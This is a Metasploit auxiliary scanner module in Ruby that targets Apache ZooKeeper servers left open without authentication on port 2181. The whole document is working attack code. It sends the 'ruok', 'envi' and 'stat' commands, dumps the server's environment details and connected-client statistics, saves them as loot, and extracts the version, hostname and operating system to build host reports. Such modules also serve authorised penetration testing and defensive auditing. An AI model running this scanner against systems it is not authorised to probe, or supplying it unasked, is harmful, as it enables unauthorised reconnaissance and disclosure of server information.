##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache ZooKeeper Information Disclosure',
        'Description' => %q{
          Apache ZooKeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.
        },
        'References' => [
          ['URL', 'https://zooKeeper.apache.org/doc/current/zookeeperAdmin.html']
        ],
        'Author' => [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
        'DisclosureDate' => '2020-10-14',
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'VERBOSE' => true }
      )
      )

    register_options(
      [
        Opt::RPORT(2181),
        OptInt.new('TIMEOUT', [true, 'Timeout for the probe', 30])
      ], self.class
    )

    deregister_options('USERNAME', 'PASSWORD')
  end

  def run_host(_ip)
    to = datastore['TIMEOUT'].zero? ? 30 : datastore['TIMEOUT']
    vprint_status("Using a timeout of #{to}...")
    begin
      ::Timeout.timeout(to) do
        connect
        print_status('Verifying if service is responsive...')
        sock.put('ruok')
        data = sock.get_once(-1, to).to_s

        if data && (data.to_s =~ /imok/ || data.to_s =~ /whitelist/)
          print_good("Service looks fine. Going ahead with extraction..\n")
          sock.close

          connect
          print_status('Dumping environment info...')
          sock.put('envi')
          data = sock.get_once(-1, to).to_s

          if data && (data.to_s !~ /whitelist/)
            print_good(data.to_s)
            sock.close

            loot_name = 'environ-log'
            loot_type = 'text/plain'
            loot_desc = 'ZooKeeper Environment Log'
            loot_service = 'ZooKeeper'
            p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
            print_good("File saved in: #{p} \n")

            version = data.match(/zookeeper.version=\s*\S*/).to_s.split('=')[1].split(',')[0]
            hname = data.match(/host.name=\s*\S*/).to_s.split('=')[1]
            os_type = data.match(/os.name=\s*\S*/).to_s.split('=')[1]
            os_arch = data.match(/os.arch=\s*\S*/).to_s.split('=')[1]
            os_ver = data.match(/os.version=\s*\S*/).to_s.split('=')[1]
            os = "#{os_type} #{os_arch} #{os_ver}"

            host_info = {
              host: rhost,
              os_name: os_type,
              name: hname,
              comments: os
            }
            report_host(host_info)
            report_service(host: rhost, port: rport, name: 'ZooKeeper', info: "Apache ZooKeeper: #{version}")
          else
            print_error('Server does not allow accessing environment information.')
            host_info = {
              host: rhost
            }
            report_host(host_info)
            report_service(host: rhost, port: rport, name: 'ZooKeeper', info: 'Apache ZooKeeper')
          end

          connect
          print_status('Dumping statistics about performance and connected clients...')
          sock.put('stat')
          data = sock.get_once(-1, to).to_s

          if data && (data.to_s !~ /whitelist/)
            print_good(data.to_s)
            sock.close

            loot_name = 'stat-log'
            loot_type = 'text/plain'
            loot_desc = 'ZooKeeper Stat Log'
            loot_service = 'ZooKeeper'
            p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
            print_good("File saved in: #{p} \n")
          else
            print_error('Server does not allow accessing statistics.')
          end
        else
          print_error('No good response from server. Exiting.')
        end
      end
    rescue Timeout::Error, ::Rex::TimeoutError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Connection Failed...")
    ensure
      disconnect
    end
  end
end
